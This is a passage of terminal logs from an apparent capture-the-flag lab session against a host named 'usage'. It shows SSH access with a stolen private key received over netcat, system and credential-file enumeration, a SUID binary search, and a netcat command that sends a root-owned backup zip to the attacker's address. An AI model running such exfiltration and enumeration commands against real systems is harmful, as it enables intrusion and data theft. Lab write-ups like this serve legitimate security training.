

```sh
┌──(kali㉿kali)-[~/thm/usage]
└─$ nc -lp 12345 > id_rsa   
^C
```

```sh
┌──(kali㉿kali)-[~/thm/usage]
└─$ ls -la
total 16
drwxr-xr-x  2 kali kali 4096 Apr 26 00:07 .
drwxr-xr-x 16 kali kali 4096 Apr 25 21:52 ..
-rw-r--r--  1 kali kali 2590 Apr 26 00:08 id_rsa
-rw-r--r--  1 kali kali 1284 Apr 25 21:52 request.txt
                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ chmod 600 id_rsa 
```

`ssh -i id_rsa dash@10.10.11.18`

```sh
┌──(kali㉿kali)-[~/thm/usage]
└─$ ssh -i id_rsa dash@10.10.11.18
The authenticity of host '10.10.11.18 (10.10.11.18)' can´t be established.
ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.18' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Apr  8 01:17:46 PM UTC 2024

  System load:           1.9072265625
  Usage of /:            64.8% of 6.53GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             254
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.18
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5616


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 12:35:43 2024 from 10.10.14.40
dash@usage:~$ sudo -l
[sudo] password for dash: 
Sorry, try again.
[sudo] password for dash: 
Sorry, try again.
[sudo] password for dash: 
sudo: 3 incorrect password attempts
dash@usage:~$ sudo -l
[sudo] password for dash: 
Sorry, try again.
[sudo] password for dash: 
Sorry, try again.
[sudo] password for dash: 
sudo: 3 incorrect password attempts
dash@usage:~$ sudo -l
[sudo] password for dash: 
Sorry, try again.
[sudo] password for dash: 
Sorry, try again.
[sudo] password for dash: 
sudo: 3 incorrect password attempts
dash@usage:~$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 Apr 25 22:17 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Apr 25 22:17 .monit.pid
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw------- 1 dash dash 1192 Apr 25 22:17 .monit.state
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Apr 25 21:29 user.txt
dash@usage:~$ cd..
cd..: command not found
dash@usage:~$ ls -la
total 48
drwxr-x--- 6 dash dash 4096 Apr 25 22:19 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw------- 1 dash dash 1192 Apr 25 22:19 .monit.state
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Apr 25 21:29 user.txt
dash@usage:~$ cd ..
dash@usage:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-xr-x 19 root   root   4096 Apr  2 21:15 ..
drwxr-x---  6 dash   dash   4096 Apr 25 22:19 dash
drwxr-x---  5 xander xander 4096 Apr 25 21:55 xander
dash@usage:/home$ cd xander
-bash: cd: xander: Permission denied
dash@usage:/home$ cd ..
dash@usage:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Apr  2 21:15 .
drwxr-xr-x  19 root root  4096 Apr  2 21:15 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Apr  2 20:20 boot
drwxr-xr-x  20 root root  3960 Apr 25 21:29 dev
drwxr-xr-x 114 root root  4096 Apr  8 12:21 etc
drwxr-xr-x   4 root root  4096 Aug 16  2023 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Aug  6  2023 lost+found
drwxr-xr-x   2 root root  4096 Apr  2 21:15 media
drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
drwxr-xr-x   2 root root  4096 Oct 26  2023 opt
dr-xr-xr-x 294 root root     0 Apr 25 21:29 proc
drwx------   7 root root  4096 Apr 25 21:29 root
drwxr-xr-x  30 root root   920 Apr 25 22:14 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 Feb 17  2023 snap
drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
dr-xr-xr-x  13 root root     0 Apr 25 21:29 sys
drwxrwxrwt  13 root root  4096 Apr 25 22:09 tmp
drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
drwxr-xr-x  14 root root  4096 Apr  2 21:15 var
dash@usage:/$ cd tmp
dash@usage:/tmp$ ls -la
total 52
drwxrwxrwt 13 root root 4096 Apr 25 22:09 .
drwxr-xr-x 19 root root 4096 Apr  2 21:15 ..
drwxrwxrwt  2 root root 4096 Apr 25 21:29 .font-unix
drwxrwxrwt  2 root root 4096 Apr 25 21:29 .ICE-unix
drwx------  3 root root 4096 Apr 25 21:29 snap-private-tmp
drwx------  3 root root 4096 Apr 25 21:29 systemd-private-57f329cf877f44d49cd4675e62dff008-ModemManager.service-qI2ooW
drwx------  3 root root 4096 Apr 25 21:29 systemd-private-57f329cf877f44d49cd4675e62dff008-systemd-logind.service-mZojH2
drwx------  3 root root 4096 Apr 25 21:29 systemd-private-57f329cf877f44d49cd4675e62dff008-systemd-resolved.service-1LWlTr
drwx------  3 root root 4096 Apr 25 21:29 systemd-private-57f329cf877f44d49cd4675e62dff008-systemd-timesyncd.service-MmMZaZ
drwxrwxrwt  2 root root 4096 Apr 25 21:29 .Test-unix
drwx------  2 root root 4096 Apr 25 21:29 vmware-root_783-4281646632
drwxrwxrwt  2 root root 4096 Apr 25 21:29 .X11-unix
drwxrwxrwt  2 root root 4096 Apr 25 21:29 .XIM-unix
dash@usage:/tmp$ cd ..
dash@usage:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Apr  2 21:15 .
drwxr-xr-x  19 root root  4096 Apr  2 21:15 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Apr  2 20:20 boot
drwxr-xr-x  20 root root  3960 Apr 25 21:29 dev
drwxr-xr-x 114 root root  4096 Apr  8 12:21 etc
drwxr-xr-x   4 root root  4096 Aug 16  2023 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Aug  6  2023 lost+found
drwxr-xr-x   2 root root  4096 Apr  2 21:15 media
drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
drwxr-xr-x   2 root root  4096 Oct 26  2023 opt
dr-xr-xr-x 294 root root     0 Apr 25 21:29 proc
drwx------   7 root root  4096 Apr 25 21:29 root
drwxr-xr-x  30 root root   920 Apr 25 22:14 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 Feb 17  2023 snap
drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
dr-xr-xr-x  13 root root     0 Apr 25 21:29 sys
drwxrwxrwt  13 root root  4096 Apr 25 22:09 tmp
drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
drwxr-xr-x  14 root root  4096 Apr  2 21:15 var
dash@usage:/$ cd opt
dash@usage:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Oct 26  2023 .
drwxr-xr-x 19 root root 4096 Apr  2 21:15 ..
dash@usage:/opt$ cd ..
dash@usage:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Apr  2 21:15 .
drwxr-xr-x  19 root root  4096 Apr  2 21:15 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Apr  2 20:20 boot
drwxr-xr-x  20 root root  3960 Apr 25 21:29 dev
drwxr-xr-x 114 root root  4096 Apr  8 12:21 etc
drwxr-xr-x   4 root root  4096 Aug 16  2023 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Aug  6  2023 lost+found
drwxr-xr-x   2 root root  4096 Apr  2 21:15 media
drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
drwxr-xr-x   2 root root  4096 Oct 26  2023 opt
dr-xr-xr-x 294 root root     0 Apr 25 21:29 proc
drwx------   7 root root  4096 Apr 25 21:29 root
drwxr-xr-x  30 root root   920 Apr 25 22:14 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 Feb 17  2023 snap
drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
dr-xr-xr-x  13 root root     0 Apr 25 21:29 sys
drwxrwxrwt  13 root root  4096 Apr 25 22:09 tmp
drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
drwxr-xr-x  14 root root  4096 Apr  2 21:15 var
dash@usage:/$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
dash@usage:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dash:x:1000:1000:dash:/home/dash:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xander:x:1001:1001::/home/xander:/bin/bash
clamav:x:115:121::/var/lib/clamav:/bin/false
_laurel:x:998:997::/var/log/laurel:/bin/false
dash@usage:/$ cd var
dash@usage:/var$ ls -la
total 56
drwxr-xr-x 14 root root   4096 Apr  2 21:15 .
drwxr-xr-x 19 root root   4096 Apr  2 21:15 ..
drwxr-xr-x  2 root root   4096 Apr  3 12:39 backups
drwxr-xr-x 16 root root   4096 Apr  2 21:15 cache
drwxrwxrwt  2 root root   4096 Apr  2 21:15 crash
drwxr-xr-x 48 root root   4096 Apr  8 12:00 lib
drwxrwsr-x  2 root staff  4096 Apr  2 21:15 local
lrwxrwxrwx  1 root root      9 Feb 17  2023 lock -> /run/lock
drwxrwxr-x 14 root syslog 4096 Apr 25 21:29 log
drwxrwsr-x  2 root mail   4096 Apr  2 21:15 mail
drwxr-xr-x  2 root root   4096 Apr  2 21:15 opt
lrwxrwxrwx  1 root root      4 Feb 17  2023 run -> /run
drwxr-xr-x  5 root root   4096 Apr  2 21:15 snap
drwxr-xr-x  4 root root   4096 Apr  2 21:15 spool
drwxrwxrwt  6 root root   4096 Apr 25 22:09 tmp
drwxr-xr-x  3 root root   4096 Apr  2 21:15 www
dash@usage:/var$ cd backups/
dash@usage:/var/backups$ ls -la
total 4392
drwxr-xr-x  2 root root    4096 Apr 25 22:31 .
drwxr-xr-x 14 root root    4096 Apr  2 21:15 ..
-rw-r--r--  1 root root   71680 Oct 12  2023 alternatives.tar.0
-rw-r--r--  1 root root    3467 Oct 11  2023 alternatives.tar.1.gz
-rw-r--r--  1 root root    3447 Sep 21  2023 alternatives.tar.2.gz
-rw-r--r--  1 root root    3451 Aug 17  2023 alternatives.tar.3.gz
-rw-r--r--  1 root root    2521 Aug  7  2023 alternatives.tar.4.gz
-rw-r--r--  1 root root   44870 Apr  3 12:38 apt.extended_states.0
-rw-r--r--  1 root root    4870 Mar 14 14:05 apt.extended_states.1.gz
-rw-r--r--  1 root root    5288 Mar 14 14:00 apt.extended_states.2.gz
-rw-r--r--  1 root root    5302 Oct 28 02:53 apt.extended_states.3.gz
-rw-r--r--  1 root root    5297 Oct 27 07:02 apt.extended_states.4.gz
-rw-r--r--  1 root root    5298 Oct 26  2023 apt.extended_states.5.gz
-rw-r--r--  1 root root    5309 Oct 26  2023 apt.extended_states.6.gz
-rw-r--r--  1 root root       0 Oct 27 04:34 dpkg.arch.0
-rw-r--r--  1 root root      32 Oct 12  2023 dpkg.arch.1.gz
-rw-r--r--  1 root root      32 Oct 11  2023 dpkg.arch.2.gz
-rw-r--r--  1 root root      32 Sep 21  2023 dpkg.arch.3.gz
-rw-r--r--  1 root root      32 Aug 19  2023 dpkg.arch.4.gz
-rw-r--r--  1 root root      32 Aug 17  2023 dpkg.arch.5.gz
-rw-r--r--  1 root root      32 Aug 16  2023 dpkg.arch.6.gz
-rw-r--r--  1 root root     268 Aug  6  2023 dpkg.diversions.0
-rw-r--r--  1 root root     140 Aug  6  2023 dpkg.diversions.1.gz
-rw-r--r--  1 root root     140 Aug  6  2023 dpkg.diversions.2.gz
-rw-r--r--  1 root root     140 Aug  6  2023 dpkg.diversions.3.gz
-rw-r--r--  1 root root     140 Aug  6  2023 dpkg.diversions.4.gz
-rw-r--r--  1 root root     140 Aug  6  2023 dpkg.diversions.5.gz
-rw-r--r--  1 root root     140 Aug  6  2023 dpkg.diversions.6.gz
-rw-r--r--  1 root root     172 Aug  6  2023 dpkg.statoverride.0
-rw-r--r--  1 root root     161 Aug  6  2023 dpkg.statoverride.1.gz
-rw-r--r--  1 root root     161 Aug  6  2023 dpkg.statoverride.2.gz
-rw-r--r--  1 root root     161 Aug  6  2023 dpkg.statoverride.3.gz
-rw-r--r--  1 root root     161 Aug  6  2023 dpkg.statoverride.4.gz
-rw-r--r--  1 root root     161 Aug  6  2023 dpkg.statoverride.5.gz
-rw-r--r--  1 root root     161 Aug  6  2023 dpkg.statoverride.6.gz
-rw-r--r--  1 root root  852194 Oct 26  2023 dpkg.status.0
-rw-r--r--  1 root root  209490 Oct 11  2023 dpkg.status.1.gz
-rw-r--r--  1 root root  209369 Oct 10  2023 dpkg.status.2.gz
-rw-r--r--  1 root root  209172 Aug 24  2023 dpkg.status.3.gz
-rw-r--r--  1 root root  205268 Aug 17  2023 dpkg.status.4.gz
-rw-r--r--  1 root root  205064 Aug 16  2023 dpkg.status.5.gz
-rw-r--r--  1 root root  205067 Aug 14  2023 dpkg.status.6.gz
-rw-r--r--  1 root root 2097152 Apr 25 22:31 project.zip
dash@usage:/var/backups$ nc 10.10.14.161 12345 < project.zip
^C
dash@usage:/var/backups$ ls -la
total 55900
drwxr-xr-x  2 root root     4096 Apr 25 22:36 .
drwxr-xr-x 14 root root     4096 Apr  2 21:15 ..
-rw-r--r--  1 root root    71680 Oct 12  2023 alternatives.tar.0
-rw-r--r--  1 root root     3467 Oct 11  2023 alternatives.tar.1.gz
-rw-r--r--  1 root root     3447 Sep 21  2023 alternatives.tar.2.gz
-rw-r--r--  1 root root     3451 Aug 17  2023 alternatives.tar.3.gz
-rw-r--r--  1 root root     2521 Aug  7  2023 alternatives.tar.4.gz
-rw-r--r--  1 root root    44870 Apr  3 12:38 apt.extended_states.0
-rw-r--r--  1 root root     4870 Mar 14 14:05 apt.extended_states.1.gz
-rw-r--r--  1 root root     5288 Mar 14 14:00 apt.extended_states.2.gz
-rw-r--r--  1 root root     5302 Oct 28 02:53 apt.extended_states.3.gz
-rw-r--r--  1 root root     5297 Oct 27 07:02 apt.extended_states.4.gz
-rw-r--r--  1 root root     5298 Oct 26  2023 apt.extended_states.5.gz
-rw-r--r--  1 root root     5309 Oct 26  2023 apt.extended_states.6.gz
-rw-r--r--  1 root root        0 Oct 27 04:34 dpkg.arch.0
-rw-r--r--  1 root root       32 Oct 12  2023 dpkg.arch.1.gz
-rw-r--r--  1 root root       32 Oct 11  2023 dpkg.arch.2.gz
-rw-r--r--  1 root root       32 Sep 21  2023 dpkg.arch.3.gz
-rw-r--r--  1 root root       32 Aug 19  2023 dpkg.arch.4.gz
-rw-r--r--  1 root root       32 Aug 17  2023 dpkg.arch.5.gz
-rw-r--r--  1 root root       32 Aug 16  2023 dpkg.arch.6.gz
-rw-r--r--  1 root root      268 Aug  6  2023 dpkg.diversions.0
-rw-r--r--  1 root root      140 Aug  6  2023 dpkg.diversions.1.gz
-rw-r--r--  1 root root      140 Aug  6  2023 dpkg.diversions.2.gz
-rw-r--r--  1 root root      140 Aug  6  2023 dpkg.diversions.3.gz
-rw-r--r--  1 root root      140 Aug  6  2023 dpkg.diversions.4.gz
-rw-r--r--  1 root root      140 Aug  6  2023 dpkg.diversions.5.gz
-rw-r--r--  1 root root      140 Aug  6  2023 dpkg.diversions.6.gz
-rw-r--r--  1 root root      172 Aug  6  2023 dpkg.statoverride.0
-rw-r--r--  1 root root      161 Aug  6  2023 dpkg.statoverride.1.gz
-rw-r--r--  1 root root      161 Aug  6  2023 dpkg.statoverride.2.gz
-rw-r--r--  1 root root      161 Aug  6  2023 dpkg.statoverride.3.gz
-rw-r--r--  1 root root      161 Aug  6  2023 dpkg.statoverride.4.gz
-rw-r--r--  1 root root      161 Aug  6  2023 dpkg.statoverride.5.gz
-rw-r--r--  1 root root      161 Aug  6  2023 dpkg.statoverride.6.gz
-rw-r--r--  1 root root   852194 Oct 26  2023 dpkg.status.0
-rw-r--r--  1 root root   209490 Oct 11  2023 dpkg.status.1.gz
-rw-r--r--  1 root root   209369 Oct 10  2023 dpkg.status.2.gz
-rw-r--r--  1 root root   209172 Aug 24  2023 dpkg.status.3.gz
-rw-r--r--  1 root root   205268 Aug 17  2023 dpkg.status.4.gz
-rw-r--r--  1 root root   205064 Aug 16  2023 dpkg.status.5.gz
-rw-r--r--  1 root root   205067 Aug 14  2023 dpkg.status.6.gz
-rw-r--r--  1 root root 54841130 Apr 25 22:36 project.zip
dash@usage:/var/backups$ cd ..
dash@usage:/var$ ls -la
total 56
drwxr-xr-x 14 root root   4096 Apr  2 21:15 .
drwxr-xr-x 19 root root   4096 Apr  2 21:15 ..
drwxr-xr-x  2 root root   4096 Apr 25 22:36 backups
drwxr-xr-x 16 root root   4096 Apr  2 21:15 cache
drwxrwxrwt  2 root root   4096 Apr  2 21:15 crash
drwxr-xr-x 48 root root   4096 Apr  8 12:00 lib
drwxrwsr-x  2 root staff  4096 Apr  2 21:15 local
lrwxrwxrwx  1 root root      9 Feb 17  2023 lock -> /run/lock
drwxrwxr-x 14 root syslog 4096 Apr 25 21:29 log
drwxrwsr-x  2 root mail   4096 Apr  2 21:15 mail
drwxr-xr-x  2 root root   4096 Apr  2 21:15 opt
lrwxrwxrwx  1 root root      4 Feb 17  2023 run -> /run
drwxr-xr-x  5 root root   4096 Apr  2 21:15 snap
drwxr-xr-x  4 root root   4096 Apr  2 21:15 spool
drwxrwxrwt  6 root root   4096 Apr 25 22:09 tmp
drwxr-xr-x  3 root root   4096 Apr  2 21:15 www
dash@usage:/var$ cd log
dash@usage:/var/log$ ls -la
total 1820
drwxrwxr-x  14 root      syslog            4096 Apr 25 21:29 .
drwxr-xr-x  14 root      root              4096 Apr  2 21:15 ..
-rw-r--r--   1 root      root               832 Apr 25 21:29 alternatives.log
drwxr-x---   2 root                    4   4096 Apr  8 12:16 apache2
drwxr-xr-x   2 root      root              4096 Apr  8 12:16 apt
drwxr-x---   2 root      adm               4096 Apr  8 12:18 audit
-rw-r-----   1 syslog    adm              11280 Apr 25 22:36 auth.log
-rw-r-----   1 syslog    adm               4653 Apr 25 21:29 auth.log.1
-rw-rw----   1 root      utmp                 0 Apr  8 12:18 btmp
drwxr-xr-x   2 clamav    clamav            4096 Apr  8 12:16 clamav
drwxr-xr-x   2 root      root              4096 Apr  2 21:15 dist-upgrade
-rw-r-----   1 root      adm                 67 Apr 25 21:29 dmesg
-rw-r-----   1 root      adm                 67 Apr  8 13:17 dmesg.0
-rw-r-----   1 root      adm                 95 Apr  8 12:35 dmesg.1.gz
-rw-r-----   1 root      adm                 95 Apr  8 12:18 dmesg.2.gz
drwxr-x---   4 root                    4   4096 Apr  8 12:16 installer
drwxr-sr-x+  3 root      systemd-journal   4096 Apr  2 21:15 journal
-rw-r-----   1 syslog    adm                755 Apr 25 22:35 kern.log
-rw-r-----   1 syslog    adm             624664 Apr 25 21:29 kern.log.1
drwxr-xr-x   2 landscape landscape         4096 Apr  8 12:20 landscape
-rw-rw-r--   1 root      utmp            292584 Apr 25 22:29 lastlog
drwxr-xr-x   2 _laurel   _laurel           4096 Apr 25 21:34 laurel
drwxr-x---   2 mysql     adm               4096 Apr 25 21:29 mysql
drwxr-xr-x   2 root      adm               4096 Apr 25 21:29 nginx
-rw-------   1 root      root               293 Apr 25 21:36 php8.1-fpm.log
-rw-------   1 root      root               846 Apr  8 13:18 php8.1-fpm.log.1
drwx------   2 root      root              4096 Apr  2 21:15 private
-rw-r-----   1 syslog    adm             225935 Apr 25 22:36 syslog
-rw-r-----   1 syslog    adm             825002 Apr 25 21:29 syslog.1
-rw-r--r--   1 root      root               193 Apr  8 13:17 vmware-network.1.log
-rw-r--r--   1 root      root               193 Apr  8 12:35 vmware-network.2.log
-rw-r--r--   1 root      root               193 Apr  8 12:18 vmware-network.3.log
-rw-r--r--   1 root      root               195 Apr 25 21:29 vmware-network.log
-rw-------   1 root      root              3320 Apr  8 13:19 vmware-vmsvc-root.1.log
-rw-------   1 root      root              3320 Apr  8 12:40 vmware-vmsvc-root.2.log
-rw-------   1 root      root              3320 Apr  8 12:22 vmware-vmsvc-root.3.log
-rw-------   1 root      root              6359 Apr 25 21:29 vmware-vmsvc-root.log
-rw-------   1 root      root              2304 Apr 25 21:29 vmware-vmtoolsd-root.log
-rw-rw-r--   1 root      utmp             10368 Apr 25 22:29 wtmp
dash@usage:/var/log$ cd /root
-bash: cd: /root: Permission denied
dash@usage:/var/log$ cat /etc/shadow
cat: /etc/shadow: Permission denied
dash@usage:/var/log$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /snap/core20/2015/usr/bin/chage
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/2015/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/2015/usr/bin/chsh
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /snap/core20/2015/usr/bin/expiry
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/2015/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 May 30  2023 /snap/core20/2015/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/2015/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/2015/usr/bin/passwd
-rwxr-sr-x 1 root systemd-timesync 350504 Jul 19  2023 /snap/core20/2015/usr/bin/ssh-agent
-rwsr-xr-x 1 root root 67816 May 30  2023 /snap/core20/2015/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /snap/core20/2015/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 May 30  2023 /snap/core20/2015/usr/bin/umount
-rwxr-sr-x 1 root tty 35048 May 30  2023 /snap/core20/2015/usr/bin/wall
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Jul 19  2023 /snap/core20/2015/usr/lib/openssh/ssh-keysign
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /snap/core20/2015/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /snap/core20/2015/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 84512 Nov 29  2022 /snap/core20/1974/usr/bin/chage
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
-rwxr-sr-x 1 root shadow 31312 Nov 29  2022 /snap/core20/1974/usr/bin/expiry
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 May 30  2023 /snap/core20/1974/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
-rwxr-sr-x 1 root systemd-timesync 350504 Apr  3  2023 /snap/core20/1974/usr/bin/ssh-agent
-rwsr-xr-x 1 root root 67816 May 30  2023 /snap/core20/1974/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 May 30  2023 /snap/core20/1974/usr/bin/umount
-rwxr-sr-x 1 root tty 35048 May 30  2023 /snap/core20/1974/usr/bin/wall
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
-rwxr-sr-x 1 root shadow 43168 Feb  2  2023 /snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43160 Feb  2  2023 /snap/core20/1974/usr/sbin/unix_chkpwd
-rwsr-xr-x 1 root root 131832 Sep 15  2023 /snap/snapd/20290/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 131832 Aug  4  2023 /snap/snapd/19993/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 142536 Mar  6 21:18 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 338536 Jan  2 16:54 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwxr-sr-x 1 root utmp 14488 Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-x 1 root root 30872 Feb 26  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 72072 Feb  6 12:54 /usr/bin/gpasswd
